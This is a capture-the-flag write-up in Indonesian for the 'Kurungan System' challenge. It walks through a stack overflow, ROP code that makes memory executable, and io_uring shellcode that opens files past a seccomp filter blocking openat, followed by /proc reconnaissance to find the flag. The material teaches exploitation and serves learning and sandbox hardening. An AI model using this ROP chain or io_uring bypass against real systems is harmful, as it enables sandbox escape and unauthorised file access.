<!-- category: Binary Exploitation | points: 789 -->
# Kurungan System

| | |
| :--- | :--- |
| **Challenge** | Kurungan System |
| **Kategori** | Binary Exploitation · Eliminasi |
| **Poin** | 789 (dynamic scoring, awal 1000) |
| **Connection** | `nc 168.110.219.59 5025` — attachment `kurungan.bin` |
| **Solver** | nexsus404 |
| **Status** | Solved |

> Program membatasi panggilan sistem. Tentukan panggilan yang masih diizinkan untuk membaca
> bendera.

![soal](img/01-soal.png)

---

## 1. Flag

```
TechtonicExpoCTF{boleh_read_66394FFC}
```

![flag diterima](img/06-flag.png)

---

## 2. Analisis Awal

### Identifikasi binary

```bash
file kurungan.bin
checksec file kurungan.bin
```

```
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
Full RELRO | No Canary Found | NX enabled | PIE Enabled | No Symbols
```

NX aktif dan PIE aktif, tapi **tidak ada stack canary**. Kombinasi ini sudah mengarahkan ke
overflow + ROP, asalkan PIE bisa dijatuhkan.

### Strings membocorkan seluruh rencana soal

```bash
strings kurungan.bin | grep -viE '^_|^\.|gcc|GLIBC'
```

```
alamat bss   : %p
alamat main  : %p
masukan isi  :
|       KURUNGAN SYSTEM v3.0            |
|  seccomp aktif: open & execve mati    |
|  jalur keluar  : io_uring saja        |
```

Program **membocorkan alamat bss dan main sendiri** (PIE runtuh gratis), dan bannernya menyebut
jalur keluarnya: **io_uring**.

Fungsi yang diimpor juga menceritakan banyak:

```bash
objdump -R kurungan.bin | grep JUMP_SLOT
```

```
puts  write  printf  read  prctl  setvbuf  mprotect
```

Ada **`mprotect`** — artinya memori bisa dijadikan RWX untuk menampung shellcode.

### Membongkar filter seccomp

`prctl` dipanggil dua kali dari fungsi di `0x1199`:

```
11ec: mov $0x26,%edi ; call prctl    -> prctl(PR_SET_NO_NEW_PRIVS=38, 1, 0,0,0)
11b2: mov $0x2b,%ecx ; rep movsq     -> salin 43 x 8 byte filter BPF dari .rodata:0x2020
120a: mov $0x16,%edi ; call prctl    -> prctl(PR_SET_SECCOMP=22, SECCOMP_MODE_FILTER=2, &fprog)
```

43 instruksi BPF di `.rodata:0x2020`, di-decode dengan [`bpf.py`](bpf.py):

```bash
python3 bpf.py
```

```
SYSCALL DIIZINKAN: read, write, close, mmap, mprotect, munmap, brk, ioctl, exit,
                   prctl, arch_prctl, futex, set_tid_address, exit_group,
                   set_robust_list, rseq,
                   io_uring_setup, io_uring_enter, io_uring_register
default -> RET KILL_THREAD
```

**`open`, `openat`, dan `execve` tidak ada dalam daftar.** Tapi `io_uring_setup` (425) dan
`io_uring_enter` (426) ada — dan io_uring punya **operasi `IORING_OP_OPENAT` sendiri**. Operasi itu
dieksekusi oleh worker kernel io_uring, bukan lewat syscall `openat` dari proses kita, jadi filter
seccomp **tidak pernah melihatnya**. Itulah celahnya.

### Titik masuk: overflow di main

```
126a <main>:
  126e: sub  $0x40,%rsp
  1272: printf("alamat bss   : %p", 0x4040)      <- bocoran 1
  1290: printf("alamat main  : %p", main)        <- bocoran 2
  12c2: lea  -0x40(%rbp),%rax
  12c6: mov  $0x400,%edx
  12d3: call read@plt                            <- buffer 0x40, baca 0x400
  12d9: leave ; ret
```

Buffer `0x40` byte dibaca `0x400` byte → **offset ke return address = 0x40 + 8 = 0x48**.

Dan penulis soal meninggalkan gadget siap pakai tepat sebelum main:

```
121c: pop %rdi ; ret
121e: pop %rsi ; ret
1220: pop %rdx ; ret
```

![recon](img/02-recon.png)

---

## 3. Langkah Penyelesaian

### 3.1 Jatuhkan PIE dari bocoran

`main` berada di offset `0x126a` dan buffer bss di `0x4040`. Keduanya diverifikasi silang: selisih
kedua bocoran selalu `0x2DD6`, konsisten dengan `0x4040 - 0x126a`.

```python
base = leak_main - 0x126a
assert leak_bss == base + 0x4040
```

### 3.2 ROP: jadikan bss RWX, isi shellcode, lompat ke sana

Segmen RW membentang `0x3d88`–`0x5040`, jadi halaman `0x4000`–`0x6000` aman di-`mprotect`.

```python
rop  = b"A"*0x48 + p64(base+RET)                    # jaga alignment 16 byte
rop += p64(base+POP_RDI) + p64(base+0x4000)         # mprotect(bss_page,
rop += p64(base+POP_RSI) + p64(0x2000)              #          0x2000,
rop += p64(base+POP_RDX) + p64(7)                   #          RWX)
rop += p64(base+PLT_MPROTECT)
rop += p64(base+POP_RDI) + p64(0)                   # read(0,
rop += p64(base+POP_RSI) + p64(base+0x4040)         #      bss,
rop += p64(base+POP_RDX) + p64(0x400)               #      0x400)
rop += p64(base+PLT_READ)
rop += p64(base+0x4040)                             # ret -> shellcode
```

Payload dikirim **dua tahap dengan jeda**: kalau ROP dan shellcode dikirim sekaligus, `read` pertama
di `main` (yang meminta `0x400`) akan menelan dua-duanya.

### 3.3 Shellcode: buka file lewat io_uring

Alur io_uring minimal:

1. `io_uring_setup(8, &params)` → ring fd
2. `mmap` ring di offset `IORING_OFF_SQ_RING` (0) dan SQE di `IORING_OFF_SQES` (0x10000000).
   Kernel memetakan `SQ_RING` dan `CQ_RING` ke objek yang sama, jadi **satu mmap cukup untuk
   keduanya**.
3. Isi SQE 64 byte: `opcode=18` (OPENAT), `fd=-100` (AT_FDCWD), `addr=path`, sisanya nol
   (`open_flags=0` = O_RDONLY)
4. `sq_array[tail & mask] = 0`, lalu `tail++`
5. `io_uring_enter(fd, 1, 1, IORING_ENTER_GETEVENTS, 0, 0)`
6. Baca `cqe.res` → itu file descriptor hasil openat

Setelah fd didapat, sisanya pakai syscall biasa — `read` dan `write` **dua-duanya ada di daftar
izin seccomp**:

```asm
mov edi, r12d          /* fd hasil io_uring */
mov rsi, BUF
mov edx, 0x200
xor eax, eax           /* read  */
syscall
mov rdx, rax
mov edi, 1
mov rsi, BUF
mov eax, 1             /* write */
syscall
```

Bypass terbukti jalan karena **errno asli** mulai kembali dari server: `ENOENT` (2) untuk path yang
tidak ada, `EACCES` (13) untuk yang tidak boleh diakses. Kalau seccomp memblokir, prosesnya akan
mati (`KILL_THREAD`), bukan mengembalikan errno.

![bypass jalan](img/03-bypass.png)

### 3.4 Berburu lokasi flag lewat /proc

Path tebakan biasa semuanya kosong (`/flag`, `/flag.txt`, `/app/flag.txt`, …). Karena sekarang ada
**pembacaan file arbitrer**, `/proc` dipakai untuk memetakan lingkungan:

```
/proc/self/cmdline  -> /srv/kurungan.bin
/proc/1/cmdline     -> /bin/sh /start34.sh
/etc/passwd         -> ada user pwn:x:1001:1001::/home/pwn:/bin/sh
/etc/hostname       -> c4dabb831acc
```

`/start34.sh` membuka semuanya:

```sh
#!/bin/sh
socat TCP-LISTEN:${PORT},fork,reuseaddr EXEC:"nsjail --config /nsjail_kurungan.cfg -- /srv/${BINER}",nofork
```

Lalu `/nsjail_kurungan.cfg`:

```
name: "pwn_kurungan"
description: "Sandbox 34 — io_uring butuh worker"
cwd: "/srv"
clone_newuser: true
uidmap { inside_id: "0"  outside_id: "65534"  count: 1 }
gidmap { inside_id: "0"  outside_id: "65534"  count: 1 }
mount { src: "/"  dst: "/"  is_bind: true  rw: false }
```

Dua fakta penting:

- **`cwd: "/srv"`** — direktori kerja soal, kandidat kuat lokasi flag
- **`uidmap 0 → 65534`** — di dalam jail kita uid 0, tapi di luar kita `nobody`. File milik uid lain
  (root, `pwn`) tidak bisa dibaca meski kita "root", karena kapabilitas user-namespace hanya berlaku
  untuk uid yang dipetakan. Ini menjelaskan `EACCES` pada `/home/pwn` dan `/proc/1/environ`.

Jadi flag pasti file **world-readable**, dan besar kemungkinan di `/srv`. Sapuan wordlist di `/srv`
menemukannya:

```
[+] /srv/rahasia.txt   fd 4, 11 byte
    boleh_read
```

![flag ditemukan](img/05-flag-ditemukan.png)

### 3.5 Jalankan solver final

```bash
python3 solve.py
```

```
[1] bocoran bss  = 0x59169c8c4040
    bocoran main = 0x59169c8c126a
    PIE base     = 0x59169c8c0000
[2] shellcode 381 byte -> 0x59169c8c4040
[3] ROP 200 byte, offset ret = 0x48
[4] /srv/rahasia.txt -> 'boleh_read'

FLAG : TechtonicExpoCTF{boleh_read_66394FFC}
```

Nama file dan isinya sama-sama bercanda soal hint: `rahasia.txt` berisi `boleh_read` — "hanya baca
yang diizinkan".

![solver final](img/04-solver.png)

---

## 4. Tools & Script yang Digunakan

| Tool | Versi | Dipakai untuk |
| :--- | :--- | :--- |
| `file` / `checksec` | — | identifikasi proteksi binary |
| `strings` | binutils | menemukan banner yang membocorkan rencana soal |
| `objdump -d` / `-R` | binutils | disassembly main, gadget, dan tabel PLT |
| `readelf -lW` | binutils | batas segmen RW untuk `mprotect` |
| **pwntools** | — | `asm()`, `remote()`, packing ROP |
| Python 3 | 3.14 | decoder BPF + exploit |

File:

- [`bpf.py`](bpf.py) — decoder filter seccomp dari `.rodata`
- [`solve.py`](solve.py) — exploit lengkap (bocoran → ROP → shellcode io_uring → flag)

`seccomp-tools` tidak tersedia di mesin, jadi filter BPF di-decode manual dengan
`struct.unpack("<HBBI", ...)` per instruksi `sock_filter`. Cuma ~20 baris, dan hasilnya lebih mudah
dibaca daripada output `seccomp-tools` karena bisa langsung dicetak sebagai daftar syscall yang
lolos.

---

## 5. Trial-and-Error / Langkah yang Gagal

| # | Yang dicoba | Hasil | Kenapa gagal |
| :-- | :--- | :--- | :--- |
| 1 | Tebak path flag umum (`/flag`, `/flag.txt`, `/app/flag.txt`, `/home/ctf/flag`, 15 path) | **Gagal** | Semua `ENOENT`. Bypass sudah jalan, tapi nama filenya salah semua |
| 2 | Hipotesis "flag sudah terbuka sebagai fd" (dari hint *hanya baca yang diizinkan*) | **Salah** | Scan `ioctl(FIONREAD)` fd 0–39: hanya fd 0,1,2 yang valid. Tidak ada fd flag |
| 3 | Scan fd pakai `read()` langsung | **Menggantung** | `read(3)` memblokir tanpa output sama sekali. Diganti `ioctl(FIONREAD)` yang tidak pernah blocking |
| 4 | `/proc/self/environ` | **Kosong** | nsjail membersihkan environment; 0 byte |
| 5 | `/proc/1/environ` (cari `${BINER}`/`${PORT}`) | **Gagal** | `EACCES` — PID 1 milik root, kita `nobody` |
| 6 | `/home/pwn/flag.txt`, `/home/pwn/flag` | **Gagal** | `EACCES`. Diagnosis: `/home/x` → `ENOENT` (jadi `/home` bisa ditelusuri) tapi `/home/pwn/x` → `EACCES`, artinya `/home/pwn` ada tapi mode 0700 milik uid 1001 |
| 7 | Baca output `python3 exploit.py ... \| tail -12` | **Salah baca sendiri** | `tail` memotong baris pertama, membuat `/srv/kurungan.bin` seolah `ENOENT`. Sempat mengira jail punya `/srv` berbeda. Dibantah oracle `ENOTDIR` |
| 8 | **Baca `/proc/1/cmdline` → `/start34.sh` → `/nsjail_kurungan.cfg`** | **Berhasil** | Menemukan `cwd: "/srv"` dan uidmap yang menjelaskan semua `EACCES` |
| 9 | **Sapuan wordlist 308 path (14 direktori × 22 nama)** | **Berhasil** | `/srv/rahasia.txt` → `boleh_read` |

Kegagalan #2 paling menarik karena **hint-nya menyesatkan kalau dibaca harfiah**. "Hanya baca yang
diizinkan" terdengar seperti "flag sudah terbuka, tinggal `read`" — hipotesis yang wajar dan cepat
diuji, tapi salah. Ternyata itu cuma deskripsi isi file `rahasia.txt` (`boleh_read`), bukan petunjuk
teknik.

Kegagalan #7 murni kesalahan sendiri: memotong output dengan `tail` lalu menarik kesimpulan dari
data yang hilang. Kalau bukan karena oracle `ENOTDIR` yang membantahnya, waktu bisa habis mengejar
teori "jail punya filesystem berbeda" yang tidak pernah ada.

---

## 6. Insight Utama & Teknik Unik

- **Kunci soal ini: io_uring adalah pintu belakang seccomp.** Seccomp menyaring **syscall**, sedangkan
  io_uring menerima **daftar operasi** lewat memori bersama dan mengeksekusinya di worker kernel.
  Jadi `IORING_OP_OPENAT` membuka file tanpa satu pun `openat` pernah melewati filter. Memblokir
  `openat` tapi mengizinkan `io_uring_setup`/`io_uring_enter` = tidak memblokir apa-apa. Filter
  seccomp yang serius harus menolak seluruh keluarga io_uring.

- **Teknik unik — errno sebagai oracle keberadaan file.** Setelah pembacaan arbitrer didapat, nilai
  errno membedakan tiga keadaan: `ENOENT` (2) tidak ada, `EACCES` (13) ada tapi tertutup,
  `ENOTDIR` (20) ada dan berupa **file biasa**. Yang terakhir bisa dipaksa dengan menambahkan
  komponen palsu: `openat("/srv/kurungan.bin/x")` → `ENOTDIR` membuktikan `kurungan.bin` ada, bahkan
  tanpa membukanya. Ini pengganti `getdents` (yang diblokir) untuk memverifikasi keberadaan file.

- **`/proc` adalah peta, bukan sekadar file.** Rantai `/proc/1/cmdline` → skrip start → konfigurasi
  nsjail mengubah tebak-tebakan buta jadi pencarian terarah dalam tiga pembacaan. `cmdline`,
  `mountinfo`, dan `/etc/passwd` bersama-sama menjelaskan **siapa kita**, **di mana kita**, dan
  **apa yang boleh kita baca** — jauh lebih efisien daripada wordlist besar sejak awal.

- **Baca konfigurasi sandbox untuk memahami kegagalan izin.** `uidmap { inside 0 → outside 65534 }`
  menjelaskan sekaligus semua `EACCES` yang membingungkan: di dalam jail kita "root", tapi kernel
  memeriksa izin dengan kredensial luar (`nobody`). Kapabilitas user-namespace seperti
  `CAP_DAC_OVERRIDE` hanya berlaku untuk uid yang dipetakan, jadi file milik root atau `pwn` tetap
  tertutup. Tanpa membaca config ini, `EACCES` pada `/home/pwn` mudah disalahartikan sebagai
  "flag ada di sini tapi soalnya rusak".

- **Pelajaran:** jangan menyimpulkan dari output yang dipotong. `tail -12` sempat menghapus baris
  yang membantah teori yang salah (#7). Saat menyelidiki, cetak penuh dulu, saring belakangan.

<!--
CHECKLIST ISI MINIMAL (slide "Format dan Isi Write-up")
  [x] 1. Judul dan kategori challenge     -> tabel info + metadata
  [x] 2. Flag yang ditemukan              -> bagian 1
  [x] 3. Analisis awal                    -> bagian 2 (checksec, strings, decode seccomp, offset)
  [x] 4. Langkah penyelesaian             -> bagian 3 (3.1 - 3.5)
  [x] 5. Tools atau script                -> bagian 4 + solve.py + bpf.py
  [x] 6. Trial-and-error / langkah gagal  -> bagian 5 (9 poin, 7 gagal, semua nyata)
  [x] 7. Insight utama / teknik unik      -> bagian 6
-->
